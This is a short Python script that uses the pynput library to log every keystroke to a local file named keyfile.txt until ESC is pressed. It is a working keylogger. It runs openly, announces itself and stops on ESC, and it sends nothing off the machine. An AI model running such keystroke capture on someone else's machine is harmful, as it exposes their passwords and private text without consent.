from pynput import keyboard                                    

def on_press(key):                                             
    try:
        with open("keyfile.txt", 'a') as logKey:               
            if hasattr(key, 'char') and key.char:              
                logKey.write(key.char)                         
            else:
                logKey.write(f'[{key}]')                       
    except Exception as e:                                    
        print(f"Error logging key: {e}")                       

    if key == keyboard.Key.esc:                                
        return False                                           

def main():                                                    
    print("Starting key listener. Press 'ESC' to stop.")       
    with keyboard.Listener(on_press=on_press) as listener:     
        listener.join()                                      

if __name__ == "__main__":                                   
    main()                                                     

